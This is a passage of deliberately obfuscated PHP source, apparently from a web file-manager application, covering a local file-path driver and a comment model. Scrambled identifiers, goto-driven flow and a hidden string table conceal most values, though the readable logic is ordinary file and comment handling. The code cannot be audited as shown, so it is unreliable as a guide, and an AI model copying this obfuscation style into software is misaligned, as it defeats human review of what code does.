BÉñï¡ğÆµ: $aĞòà¯õ³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e¢ˆ”¸‘‘ = $aĞòà¯õ³[1148] . md5($b·°Ù‡»ø); $dÊÒôÏø·á = Cache::get($e¢ˆ”¸‘‘); goto e’ˆ¬•µµ¯; eİåİ‚×“: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($AÂÏ¹¤¨‹Ô) { if (substr($AÂÏ¹¤¨‹Ô, 0, 2) == $_SERVER[ºÖÙÂŒäÉê‡][1137]) { $AÂÏ¹¤¨‹Ô = BASIC_PATH . substr($AÂÏ¹¤¨‹Ô, 2); } return $AÂÏ¹¤¨‹Ô; } public function iconvApp($AÍôÊ—ÔÀ) { $cÃâ­«×é¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; global $config; return $this->iconvTo($AÍôÊ—ÔÀ, $config[$cÃâ­«×é¼[1135]], $config[$cÃâ­«×é¼[1134]]); } public function iconvSystem($c¡À†š„Õğ) { $A‚¯ƒƒæ±ì =& $_SERVER[ºÖÙÂŒäÉê‡]; global $config; return $this->iconvTo($c¡À†š„Õğ, $config[$A‚¯ƒƒæ±ì[1134]], $config[$A‚¯ƒƒæ±ì[1135]]); } public function getPathOuter($aºÛ×Œ£¨¯) { goto eÃ¡õë“Ö÷; b£àƒ‰‡èÅ: if (substr($F®šË©ÌÕ , 0, 2) == $F¬ÇéËÎäÔ[1137]) { $F®šË©ÌÕ  = BASIC_PATH . substr($F®šË©ÌÕ , 2); } if (substr($aºÛ×Œ£¨¯, 0, 2) == $F¬ÇéËÎäÔ[1137]) { $aºÛ×Œ£¨¯ = BASIC_PATH . substr($aºÛ×Œ£¨¯, 2); } $F®šË©ÌÕ  = KodIO::clear($F®šË©ÌÕ ); goto EŒæŒÛ±¦; EŒæŒÛ±¦: $aºÛ×Œ£¨¯ = KodIO::clear($aºÛ×Œ£¨¯); $aºÛ×Œ£¨¯ = substr($aºÛ×Œ£¨¯, strlen($F®šË©ÌÕ )); if (empty($this->pathDriver)) { return $aºÛ×Œ£¨¯; } goto bÀ†šè¬Ğ; eÃ¡õë“Ö÷: $F¬ÇéËÎäÔ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F®šË©ÌÕ  = $this->iconvApp($this->pathBase); $aºÛ×Œ£¨¯ = $this->iconvApp($aºÛ×Œ£¨¯); goto b£àƒ‰‡èÅ; bÀ†šè¬Ğ: return $this->pathDriver . $F¬ÇéËÎäÔ[8] . ltrim($aºÛ×Œ£¨¯, $F¬ÇéËÎäÔ[8]); goto C¥¢íÉÃÜ; C¥¢íÉÃÜ: } public function mkfile($c· ò‰¹Ú, $fÆóÉ‰óµ = '', $AšÃ‘óğõ = REPEAT_RENAME) { $c· ò‰¹Ú = $this->iconvSystem($c· ò‰¹Ú); @touch($c· ò‰¹Ú); if ($fÆóÉ‰óµ) { file_put_contents($c· ò‰¹Ú, $fÆóÉ‰óµ); } return is_file($c· ò‰¹Ú) ? $this->getPathOuter($c· ò‰¹Ú) : !1; } public function mkdir($aÁ…Œ„¯‚±, $dƒ„é¤ˆĞò = REPEAT_SKIP) { $aÁ…Œ„¯‚± = $this->iconvSystem($aÁ…Œ„¯‚±); if (is_dir($aÁ…Œ„¯‚±)) { return $this->getPathOuter($aÁ…Œ„¯‚±); } @mkdir($aÁ…Œ„¯‚±, 511, !0); return is_dir($aÁ…Œ„¯‚±) ? $this->getPathOuter($aÁ…Œ„¯‚±) : !1; } public function copyFile($aÊïÕ‡©Ø, $Bò§‰‚ª°) { $this->mkdir($this->pathFather($Bò§‰‚ª°)); $aÊïÕ‡©Ø = $this->iconvSystem($aÊïÕ‡©Ø); $Bò§‰‚ª° = $this->iconvSystem($Bò§‰‚ª°); $AË‡Ô³—Îò = @copy($aÊïÕ‡©Ø, $Bò§‰‚ª°); return $AË‡Ô³—Îò ? $this->getPathOuter($Bò§‰‚ª°) : !1; } public function moveFile($CÄ¶–”¦ëÏ, $Ešáê¯ä¨) { $this->mkdir($this->pathFather($Ešáê¯ä¨)); $CÄ¶–”¦ëÏ = $this->iconvSystem($CÄ¶–”¦ëÏ); $Ešáê¯ä¨ = $this->iconvSystem($Ešáê¯ä¨); $Dóù÷ãİÏÁ = intval(@rename($CÄ¶–”¦ëÏ, $Ešáê¯ä¨)); if (!$Dóù÷ãİÏÁ) { if ($Dóù÷ãİÏÁ = intval(@copy($CÄ¶–”¦ëÏ, $Ešáê¯ä¨))) { @unlink($CÄ¶–”¦ëÏ); } } return $Dóù÷ãİÏÁ ? $this->getPathOuter($Ešáê¯ä¨) : !1; } public function delFile($b’ÛÛ§–‰Œ) { $b’ÛÛ§–‰Œ = $this->iconvSystem($b’ÛÛ§–‰Œ); if (!@unlink($b’ÛÛ§–‰Œ)) { @chmod($b’ÛÛ§–‰Œ, 511); if (!@unlink($b’ÛÛ§–‰Œ)) { return !1; } } else { return !0; } } public function delFolder($bõ¡²ñŠˆ†) { goto e‚¡’‹¹ÑÑ; e‚¡’‹¹ÑÑ: $d†¯Ìà¶“ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bõ¡²ñŠˆ† = $this->iconvSystem($bõ¡²ñŠˆ†); if (!is_dir($bõ¡²ñŠˆ†)) { return !0; } goto dÆ¤¶ì—”½; e“Š¶âô†å: return rmdir($bõ¡²ñŠˆ†); goto FÏ¬…šë¼ç; dÆ¤¶ì—”½: if (!($BÖøœËÈ‚ = opendir($bõ¡²ñŠˆ†))) { return !1; } while (($Eöïò„êÁ = readdir($BÖøœËÈ‚)) !== !1) { if ($Eöïò„êÁ == $d†¯Ìà¶“[91] || $Eöïò„êÁ == $d†¯Ìà¶“[1147]) { continue; } $aÛ…äÔš³ = $bõ¡²ñŠˆ† . $d†¯Ìà¶“[8] . $Eöïò„êÁ; if (!is_dir($aÛ…äÔš³)) { if (!unlink($aÛ…äÔš³)) { chmod($aÛ…äÔš³, 511); if (!unlink($aÛ…äÔš³)) { return !1; } } } else { chmod($aÛ…äÔš³, 511); $aÛ…äÔš³ = $this->iconvApp($aÛ…äÔš³); if (!$this->delFolder($aÛ…äÔš³)) { return !1; } } } closedir($BÖøœËÈ‚); goto e“Š¶âô†å; FÏ¬…šë¼ç: } public function rename($e›Üæ¯Çò, $AÆöÎäëå) { goto C“…„‚Ã«Æ; cš¢ØìëÉµ: $cö®´ÏŸ¾ = @rename($e›Üæ¯Çò, $d¨¬›’Ó‘); $d¨¬›’Ó‘ = $this->iconvApp($d¨¬›’Ó‘); return $cö®´ÏŸ¾ ? $this->getPathOuter($d¨¬›’Ó‘) : !1; goto C¢éÑ¡é‘; C“…„‚Ã«Æ: $e–Ÿ‚Ûïê„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a¬±õÍ°Ïò = $this->fileNameAuto($this->pathFather($e›Üæ¯Çò), $AÆöÎäëå); $a¬±õÍ°Ïò = $this->iconvSystem($a¬±õÍ°Ïò); goto F–©”ùŞ¤“; F–©”ùŞ¤“: $e›Üæ¯Çò = $this->iconvSystem($e›Üæ¯Çò); $F‰Ëºƒ„¦ = $this->pathFather($e›Üæ¯Çò); $d¨¬›’Ó‘ = rtrim($F‰Ëºƒ„¦, $e–Ÿ‚Ûïê„[8]) . $e–Ÿ‚Ûïê„[8] . $a¬±õÍ°Ïò; goto cš¢ØìëÉµ; C¢éÑ¡é‘: } public function size($Bñ¦Ï—¶Ö³) { $Bñ¦Ï—¶Ö³ = $this->iconvSystem($Bñ¦Ï—¶Ö³); return (double) abs(sprintf($_SERVER[ºÖÙÂŒäÉê‡][1149], @filesize($Bñ¦Ï—¶Ö³))); } public function info($D”ğ„òÉø) { $D”ğ„òÉø = $this->iconvSystem($D”ğ„òÉø); if ($this->isFolder($D”ğ„òÉø)) { return $this->folderInfo($D”ğ„òÉø); } else { if ($this->isFile($D”ğ„òÉø)) { return $this->fileInfo($D”ğ„òÉø); } } return !1; } protected function infoChildren($Cõ¤…›‚³©, &$dËšñÅƒ‘, $C†ä…ÂÏø¤ = true) { $CÚÅ×šÅ”î =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cõ¤…›‚³© = rtrim($Cõ¤…›‚³©, $CÚÅ×šÅ”î[8]) . $CÚÅ×šÅ”î[8]; if ($C†ä…ÂÏø¤) { check_abort(); $Cõ¤…›‚³© = $this->iconvSystem($Cõ¤…›‚³©); } if (!($BÔ´ïùä¢Ì = @opendir($Cõ¤…›‚³©))) { return; } while (($FÊ–ŞÄ˜ù = readdir($BÔ´ïùä¢Ì)) !== !1) { if ($FÊ–ŞÄ˜ù == $CÚÅ×šÅ”î[91] || $FÊ–ŞÄ˜ù == $CÚÅ×šÅ”î[1147]) { continue; } $Cœ¢³š¶è = $Cõ¤…›‚³© . $FÊ–ŞÄ˜ù; if (is_file($Cœ¢³š¶è)) { $dËšñÅƒ‘[$CÚÅ×šÅ”î[78]]++; $dËšñÅƒ‘[$CÚÅ×šÅ”î[77]] += (double) abs(sprintf($CÚÅ×šÅ”î[1149], @filesize($Cœ¢³š¶è))); } else { $dËšñÅƒ‘[$CÚÅ×šÅ”î[79]]++; $this->infoChildren($Cœ¢³š¶è, $dËšñÅƒ‘, !1); } } closedir($BÔ´ïùä¢Ì); } private function folderInfo($B²¯­¶Œ³, $Aïßá«ÔÆÂ = false) { $bºá„›¹†À =& $_SERVER[ºÖÙÂŒäÉê‡]; $B²¯­¶Œ³ = rtrim($B²¯­¶Œ³, $bºá„›¹†À[8]) . $bºá„›¹†À[8]; $bæ·‹•µ = $this->iconvApp($this->pathThis($B²¯­¶Œ³)); if ($Aïßá«ÔÆÂ) { return array($bºá„›¹†À[28] => $bæ·‹•µ, $bºá„›¹†À[75] => $this->getPathOuter($B²¯­¶Œ³), $bºá„›¹†À[29] => $bºá„›¹†À[76]); } $BáØĞƒ—í = array($bºá„›¹†À[28] => $bæ·‹•µ, $bºá„›¹†À[75] => $this->getPathOuter($B²¯­¶Œ³), $bºá„›¹†À[29] => $bºá„›¹†À[76], $bºá„›¹†À[193] => @filectime($B²¯­¶Œ³), $bºá„›¹†À[106] => @filemtime($B²¯­¶Œ³), $bºá„›¹†À[1150] => @fileatime($B²¯­¶Œ³), $bºá„›¹†À[1144] => is_readable($B²¯­¶Œ³), $bºá„›¹†À[1145] => is_writable($B²¯­¶Œ³), $bºá„›¹†À[1151] => get_mode($B²¯­¶Œ³)); return $BáØĞƒ—í; } private function fileInfo($fÑÔ…‘ĞÂ, $E»’Ğ•æö” = false) { $C½‘ æº‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c£óª™¬Ş = $this->iconvApp($this->pathThis($fÑÔ…‘ĞÂ)); if ($E»’Ğ•æö”) { return array($C½‘ æº‡[28] => $c£óª™¬Ş, $C½‘ æº‡[75] => $this->getPathOuter($fÑÔ…‘ĞÂ), $C½‘ æº‡[29] => $C½‘ æº‡[163], $C½‘ æº‡[77] => $this->size($fÑÔ…‘ĞÂ), $C½‘ æº‡[156] => $this->ext($c£óª™¬Ş)); } $cÚÅ£ä‘Œ± = array($C½‘ æº‡[28] => $c£óª™¬Ş, $C½‘ æº‡[75] => $this->getPathOuter($fÑÔ…‘ĞÂ), $C½‘ æº‡[29] => $C½‘ æº‡[163], $C½‘ æº‡[193] => @filectime($fÑÔ…‘ĞÂ), $C½‘ æº‡[106] => @filemtime($fÑÔ…‘ĞÂ), $C½‘ æº‡[1150] => @fileatime($fÑÔ…‘ĞÂ), $C½‘ æº‡[77] => $this->size($fÑÔ…‘ĞÂ), $C½‘ æº‡[156] => $this->ext($c£óª™¬Ş), $C½‘ æº‡[1144] => is_readable($fÑÔ…‘ĞÂ), $C½‘ æº‡[1145] => is_writable($fÑÔ…‘ĞÂ), $C½‘ æº‡[1151] => get_mode($fÑÔ…‘ĞÂ)); return $cÚÅ£ä‘Œ±; } public function exist($fî“£ËÂâã) { $fî“£ËÂâã = $this->iconvSystem($fî“£ËÂâã); return @file_exists($fî“£ËÂâã); } public function isFile($E©êŞ¹ÏÀ) { $E©êŞ¹ÏÀ = $this->iconvSystem($E©êŞ¹ÏÀ); return @is_file($E©êŞ¹ÏÀ); } public function isFolder($eéÅîÜ÷ÀÊ) { $eéÅîÜ÷ÀÊ = $this->iconvSystem($eéÅîÜ÷ÀÊ); return @is_dir($eéÅîÜ÷ÀÊ); } public function listPath($eÛé†©›ò, $b¿èÍÁ¾È¯ = false) { goto fóééÒ·©Ñ; a¶œ²‹áì·: closedir($DŠÒ‹ğÛµØ); return $fÖ¡Œ¤ÇŸ; goto céª®Óã; fóééÒ·©Ñ: $b‘ŞË«öùÈ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÛé†©›ò = $this->iconvSystem($eÛé†©›ò); $eÛé†©›ò = rtrim($eÛé†©›ò, $b‘ŞË«öùÈ[8]) . $b‘ŞË«öùÈ[8]; goto e…Ó›·Ì¦; e…Ó›·Ì¦: $fÖ¡Œ¤ÇŸ = array($b‘ŞË«öùÈ[74] => array(), $b‘ŞË«öùÈ[73] => array()); if (!($DŠÒ‹ğÛµØ = @opendir($eÛé†©›ò))) { return $fÖ¡Œ¤ÇŸ; } while (($DîÓİÖå = readdir($DŠÒ‹ğÛµØ)) !== !1) { if ($DîÓİÖå == $b‘ŞË«öùÈ[91] || $DîÓİÖå == $b‘ŞË«öùÈ[1147]) { continue; } $BÓ¡·©©ÔÉ = $eÛé†©›ò . $DîÓİÖå; if (is_file($BÓ¡·©©ÔÉ)) { $fÖ¡Œ¤ÇŸ[$b‘ŞË«öùÈ[73]][] = $this->fileInfo($BÓ¡·©©ÔÉ, $b¿èÍÁ¾È¯); } else { $fÖ¡Œ¤ÇŸ[$b‘ŞË«öùÈ[74]][] = $this->folderInfo($BÓ¡·©©ÔÉ, $b¿èÍÁ¾È¯); } } goto a¶œ²‹áì·; céª®Óã: } public function listAll($E×¼øŒèˆ, &$EİÈË­­’ß = array()) { goto CóØá®Ù¤†; dôòœ£äö: return $EİÈË­­’ß; goto aàêÙ´µˆ¶; AàÁ˜Á…ßÔ: if (!($Aë³³™ÆåÜ = @opendir($E×¼øŒèˆ))) { return $EİÈË­­’ß; } while (($fÏ©Š™ÙÎø = readdir($Aë³³™ÆåÜ)) !== !1) { if ($fÏ©Š™ÙÎø == $EÂô¶ô‡çŒ[91] || $fÏ©Š™ÙÎø == $EÂô¶ô‡çŒ[1147]) { continue; } $Añ“¦î¢âÉ = $E×¼øŒèˆ . $fÏ©Š™ÙÎø; if (is_dir($Añ“¦î¢âÉ)) { $EİÈË­­’ß[] = array($EÂô¶ô‡çŒ[75] => $Añ“¦î¢âÉ . $EÂô¶ô‡çŒ[8], $EÂô¶ô‡çŒ[76] => 1, $EÂô¶ô‡çŒ[106] => @filemtime($Añ“¦î¢âÉ), $EÂô¶ô‡çŒ[77] => 0); $this->listAll($Añ“¦î¢âÉ, $EİÈË­­’ß); } else { $EİÈË­­’ß[] = array($EÂô¶ô‡çŒ[75] => $Añ“¦î¢âÉ, $EÂô¶ô‡çŒ[76] => 0, $EÂô¶ô‡çŒ[106] => @filemtime($Añ“¦î¢âÉ), $EÂô¶ô‡çŒ[77] => $this->size($Añ“¦î¢âÉ)); } } closedir($Aë³³™ÆåÜ); goto dôòœ£äö; CóØá®Ù¤†: $EÂô¶ô‡çŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E×¼øŒèˆ = $this->iconvSystem($E×¼øŒèˆ); $E×¼øŒèˆ = rtrim($E×¼øŒèˆ, $EÂô¶ô‡çŒ[8]) . $EÂô¶ô‡çŒ[8]; goto AàÁ˜Á…ßÔ; aàêÙ´µˆ¶: } public function has($EíîäÉ¨ÂÓ, $B®ºÈË†µ = false, $E‹…ÆïƒÆá = true) { goto aÌõÚõÍ®; aÌõÚõÍ®: $Aìâµ¶±„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EíîäÉ¨ÂÓ = $this->iconvSystem($EíîäÉ¨ÂÓ); $EíîäÉ¨ÂÓ = rtrim($EíîäÉ¨ÂÓ, $Aìâµ¶±„[8]) . $Aìâµ¶±„[8]; goto f„Æ´š…ÆÆ; d‹¬°´’Œô: return !1; goto bœµ¾ğ§µÂ; f„Æ´š…ÆÆ: if (!($FÄ¨„›Š’¼ = @opendir($EíîäÉ¨ÂÓ))) { return !1; } $b±ê±ÇŒ… = 0; $cÕá’£ÅÇ = 0; goto bÕ×„ï÷¤; bÕ×„ï÷¤: while (($AèóŒ·£Ë‚ = readdir($FÄ¨„›Š’¼)) !== !1) { if ($AèóŒ·£Ë‚ == $Aìâµ¶±„[91] || $AèóŒ·£Ë‚ == $Aìâµ¶±„[1147]) { continue; } $eÍ»åÖÑË¯ = $EíîäÉ¨ÂÓ . $AèóŒ·£Ë‚; if ($B®ºÈË†µ) { if (@is_file($eÍ»åÖÑË¯)) { $b±ê±ÇŒ…++; } else { $cÕá’£ÅÇ++; } continue; } if ($E‹…ÆïƒÆá) { if (@is_file($eÍ»åÖÑË¯)) { return !0; } } else { if (@is_dir($eÍ»åÖÑË¯ . $Aìâµ¶±„[8])) { return !0; } } } closedir($FÄ¨„›Š’¼); if ($B®ºÈË†µ) { return array($Aìâµ¶±„[197] => $b±ê±ÇŒ…, $Aìâµ¶±„[198] => $cÕá’£ÅÇ); } goto d‹¬°´’Œô; bœµ¾ğ§µÂ: } public function hashSimple($dÙË­…é•Ñ) { goto Fø„£ºö–˜; b‘Êˆ‡Ê¦: fseek($e¾ÃíÕ°î, $Aöøé›÷´… - $f©å“ÜÄ¨); $Fê¡ÖÙŠîÅ .= fread($e¾ÃíÕ°î, $f©å“ÜÄ¨); fclose($e¾ÃíÕ°î); goto d—¨ñ¡Èª‘; fâ‹š›½: $Aöøé›÷´… = $this->size($dÙË­…é•Ñ); $f©å“ÜÄ¨ = 200; $bªØŠ‹©×± = 50; goto dÎŸ¥§¡±‘; d—¨ñ¡Èª‘: return md5($Fê¡ÖÙŠîÅ) . $Aöøé›÷´…; goto F™ÚÍ™ ÉÌ; Fø„£ºö–˜: $D¬ìó¥Ü£æ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$dÙË­…é•Ñ) { return md5($D¬ìó¥Ü£æ[33]); } $dÙË­…é•Ñ = $this->iconvSystem($dÙË­…é•Ñ); goto fâ‹š›½; aÕ µà³Ö: $e¾ÃíÕ°î = fopen($dÙË­…é•Ñ, $D¬ìó¥Ü£æ[1152]); if (!$e¾ÃíÕ°î) { return $Fê¡ÖÙŠîÅ; } for ($B™“³Ï• = 0; $B™“³Ï• < $bªØŠ‹©×±; $B™“³Ï•++) { fseek($e¾ÃíÕ°î, $b²»îÈÓ˜­ * $B™“³Ï•); $Fê¡ÖÙŠîÅ .= fread($e¾ÃíÕ°î, $f©å“ÜÄ¨); } goto b‘Êˆ‡Ê¦; dÎŸ¥§¡±‘: if ($Aöøé›÷´… <= $f©å“ÜÄ¨ * $bªØŠ‹©×±) { return $this->hashMd5($dÙË­…é•Ñ) . $Aöøé›÷´…; } $Fê¡ÖÙŠîÅ = $D¬ìó¥Ü£æ[33]; $b²»îÈÓ˜­ = intval($Aöøé›÷´… / $bªØŠ‹©×±); goto aÕ µà³Ö; F™ÚÍ™ ÉÌ: } public function getContent($eãÇ²›Å’¡) { $eãÇ²›Å’¡ = $this->iconvSystem($eãÇ²›Å’¡); return file_get_contents($eãÇ²›Å’¡); } public function setContent($EìÑœ­íì÷, $E º›Û‰Õğ = '') { $EìÑœ­íì÷ = $this->iconvSystem($EìÑœ­íì÷); @file_put_contents($EìÑœ­íì÷, $E º›Û‰Õğ, LOCK_EX); clearstatcache(); return strlen($E º›Û‰Õğ) == filesize($EìÑœ­íì÷); } public function fileSubstr($f¯‰²ĞíÏ‚, $c¨›‚ê£â = 0, $b……¢¤Ö´È = false) { goto f ±ï¦Ç; Bóó¦¨Éî¢: return $D‹åÍï§Ä; goto c¶±š“ªÃ; e®¨Ó³İš¼: if ($b……¢¤Ö´È <= 0) { return $c·êŸ‹ò“Û[33]; } $A°°å—‹–í = fopen($f¯‰²ĞíÏ‚, $c·êŸ‹ò“Û[1152]); if (!$A°°å—‹–í) { return !1; } goto c¬½„ˆÜ¾; c¬½„ˆÜ¾: fseek($A°°å—‹–í, $c¨›‚ê£â); $D‹åÍï§Ä = fread($A°°å—‹–í, $b……¢¤Ö´È); fclose($A°°å—‹–í); goto Bóó¦¨Éî¢; f ±ï¦Ç: $c·êŸ‹ò“Û =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¯‰²ĞíÏ‚ = $this->iconvSystem($f¯‰²ĞíÏ‚); if ($b……¢¤Ö´È === !1) { $b……¢¤Ö´È = $this->size($f¯‰²ĞíÏ‚); } goto e®¨Ó³İš¼; c¶±š“ªÃ: } public function upload($E¶ø¥ªéØ¯, $fÄÑ¶“‡”, $aŸ º´Ë…Ø = false, $e¢àî´‘¿ = REPEAT_REPLACE) { $B¤²ò¥¬ÂÃ = $this->copyFile($fÄÑ¶“‡”, $E¶ø¥ªéØ¯); return $B¤²ò¥¬ÂÃ ? $this->getPathOuter($E¶ø¥ªéØ¯) : !1; } public function download($fŒëä‚àó‡, $AôšÌ·§´ç) { return $this->iconvSystem($fŒëä‚àó‡); } } goto bŒÉÉ«ãô²; b‚”‚ÏàËÑ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\x6d\x65" => "\143\x6f\x6d\x6d\x65\156\x74\137\x6d\145\164\x61", "\155\145\164\x61\106\x69\x65\x6c\144" => "\x63\157\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($eÔ×©æ) { $cÍ×Ç´èñÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($eÔ×©æ[$cÍ×Ç´èñÉ[2093]]) { $Cšè²à = $this->where(array($cÍ×Ç´èñÉ[2094] => $eÔ×©æ[$cÍ×Ç´èñÉ[2093]]))->find(); if (!$Cšè²à || $Cšè²à[$cÍ×Ç´èñÉ[376]] != $eÔ×©æ[$cÍ×Ç´èñÉ[376]] || $Cšè²à[$cÍ×Ç´èñÉ[460]] != $eÔ×©æ[$cÍ×Ç´èñÉ[460]]) { return !1; } $this->where(array($cÍ×Ç´èñÉ[2094] => $eÔ×©æ[$cÍ×Ç´èñÉ[2093]]))->setAdd($cÍ×Ç´èñÉ[2095], 1); } return $this->add($eÔ×©æ); } public function remove($E…å¶À„Û) { $Aƒñ«‘’Œò =& $_SERVER[ºÖÙÂŒäÉê‡]; $dòÉ•øëÂ¡ = array($Aƒñ«‘’Œò[2094] => $E…å¶À„Û); $aÊ£ÛŞõ¤è = $this->where($dòÉ•øëÂ¡)->find(); if ($aÊ£ÛŞõ¤è[$Aƒñ«‘’Œò[2093]]) { $this->where(array($Aƒñ«‘’Œò[2094] => $aÊ£ÛŞõ¤è[$Aƒñ«‘’Œò[2093]]))->setAdd($Aƒñ«‘’Œò[2095], -1); } return $this->where($dòÉ•øëÂ¡)->delete(); } public function edit($B÷¹ñ¶¤ÏÉ, $BÏïßÔ¢Û) { $AŠŒ»¦åö =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÛ‚ø¡Œ£Š = array($AŠŒ»¦åö[2094] => $B÷¹ñ¶¤ÏÉ); return $this->where($dÛ‚ø¡Œ£Š)->save(array($AŠŒ»¦åö[2096] => $BÏïßÔ¢Û)); } public function prasise($FØÛØšôí­) { $B„·µ©Œ”¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¯—³¶‡·£ = Model($B„·µ©Œ”¨[2097]); $E†ù“ÜÛóÏ = array($B„·µ©Œ”¨[2094] => $FØÛØšôí­, $B„·µ©Œ”¨[1394] => USER_ID); $cïÕÍ‘‰ª„ = $f¯—³¶‡·£->where($E†ù“ÜÛóÏ)->find(); if (!$cïÕÍ‘‰ª„) { $f¯—³¶‡·£->add($E†ù“ÜÛóÏ); $A˜ë³¼Ñõ² = $this->where(array($B„·µ©Œ”¨[2094] => $FØÛØšôí­))->setAdd($B„·µ©Œ”¨[2098], 1); } else { $f¯—³¶‡·£->where($E†ù“ÜÛóÏ)->delete(); $A˜ë³¼Ñõ² = $this->where(array($B„·µ©Œ”¨[2094] => $FØÛØšôí­))->setAdd($B„·µ©Œ”¨[2098], -1); } return $A˜ë³¼Ñõ²; } public function targetInfo($e£‹™øØáÓ, $C²­š¸ë‹‹) { goto cÂÒÀÂÃÆ; cÂÒÀÂÃÆ: $C¾§¯õìê =& $_SERVER[ºÖÙÂŒäÉê‡]; $F›ÈÅ‹¬¸ó = array($C¾§¯õìê[525] => $e£‹™øØáÓ, $C¾§¯õìê[526] => $C²­š¸ë‹‹); $bŒÚÍ©–Õ» = $this->where($F›ÈÅ‹¬¸ó)->count(); goto f‰äÜ…‚×; A‰àëóïø: return $eæ†ƒ²¹Æ; goto B´™Ş„²õ; f‰äÜ…‚×: $e§à‹¤ëº– = "\x52\x49\107\x48\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\x63\157\x6d\x6d\x65\x6e\x74\x5f\x70\162\141\x69\x73\145\x20\163\x74\x61\162\x20\157\156\40\143\x6f\x6d\x6d\145\x6e\164\56\x63\x6f\155\x6d\x65\x6e\x74\111\104\40\x3d\x20\163\164\x61\x72\56\x63\x6f\x6d\155\145\x6e\164\x49\104"; $E²÷åœ‰ = $this->alias($C¾§¯õìê[346])->where($F›ÈÅ‹¬¸ó)->join($e§à‹¤ëº–, $C¾§¯õìê[2099])->count(); $eæ†ƒ²¹Æ = array($C¾§¯õìê[2100] => $bŒÚÍ©–Õ», $C¾§¯õìê[2101] => $E²÷åœ‰); goto A‰àëóïø; B´™Ş„²õ: } public function listData($FÚ—ßå¯øª) { $fùË—†‹ÍÜ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2102]])) { if ($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2102]]) { $FÚ—ßå¯øª[$fùË—†‹ÍÜ[2103]] = array($fùË—†‹ÍÜ[920], intval($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2102]])); } unset($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2102]]); } if (isset($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2104]])) { if ($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2104]]) { $FÚ—ßå¯øª[$fùË—†‹ÍÜ[2103]] = array($fùË—†‹ÍÜ[917], intval($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2104]])); } unset($FÚ—ßå¯øª[$fùË—†‹ÍÜ[2104]]); } return $this->_listData($FÚ—ßå¯øª); } private function _listData($eºÚŞ«ÃÄÓ) { $A¾Éàò‡“² =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cå…Ï­Š = $this->where($eºÚŞ«ÃÄÓ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Cå…Ï­Š[$A¾Éàò‡“²[359]]); $this->_listAppendUser($Cå…Ï­Š[$A¾Éàò‡“²[359]]); $this->_listAppendMeta($Cå…Ï­Š[$A¾Éàò‡“²[359]]); return $Cå…Ï­Š; } private function _makeOrder() { $BÅØ®×¬— =& $_SERVER[ºÖÙÂŒäÉê‡]; $C™İğô÷Ê = array($BÅØ®×¬—[2098], $BÅØ®×¬—[2095], $BÅØ®×¬—[193]); $féà¯ ª‰© = Input::get($BÅØ®×¬—[411], $BÅØ®×¬—[7], $BÅØ®×¬—[394], $C™İğô÷Ê); $EÃ³­¤ÈİÏ = Input::get($BÅØ®×¬—[412], $BÅØ®×¬—[7], $BÅØ®×¬—[1396], array($BÅØ®×¬—[2105], $BÅØ®×¬—[409])); $BğÌ‘Å…Åë = $féà¯ ª‰© . $BÅØ®×¬—[50] . $EÃ³­¤ÈİÏ; return $this->order($BğÌ‘Å…Åë); } private function _listAppendParent(&$F¡ğğóİ„Ã) { goto f›¿ï¼Âğˆ; f›¿ï¼Âğˆ: $A¡ˆÈ©ğ¤ƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eíÚ‰¼Ù©— = array_unique(array_to_keyvalue($F¡ğğóİ„Ã, $A¡ˆÈ©ğ¤ƒ[33], $A¡ˆÈ©ğ¤ƒ[2093])); $eíÚ‰¼Ù©— = array_remove_value($eíÚ‰¼Ù©—, $A¡ˆÈ©ğ¤ƒ[472]); goto Cˆ„¨¯î«‘; Cˆ„¨¯î«‘: if (!$eíÚ‰¼Ù©—) { return; } $C‡ë”ğÀøŸ = $this->where(array($A¡ˆÈ©ğ¤ƒ[2094] => array($A¡ˆÈ©ğ¤ƒ[7], $eíÚ‰¼Ù©—)))->select(); $C‡ë”ğÀøŸ = array_to_keyvalue($C‡ë”ğÀøŸ, $A¡ˆÈ©ğ¤ƒ[2103]); goto B”ÑÑ¿„Ì—; B”ÑÑ¿„Ì—: foreach ($F¡ğğóİ„Ã as &$D­·‚ÆÕ…§) { if (isset($C‡ë”ğÀøŸ[$D­·‚ÆÕ…§[$A¡ˆÈ©ğ¤ƒ[2093]]])) { $D­·‚ÆÕ…§[$A¡ˆÈ©ğ¤ƒ[2106]] = $C‡ë”ğÀøŸ[$D­·‚ÆÕ…§[$A¡ˆÈ©ğ¤ƒ[2093]]]; } } goto Eª©›ØÌ; Eª©›ØÌ: } private function _listAppendUser(&$e¶½­î¦ÑÀ) { goto d¥ßÙ«Ñ²Ù; dÃ¬¢ªñŒÜ: if (count($EáÁ£‹Çê³) == 0) { return; } foreach 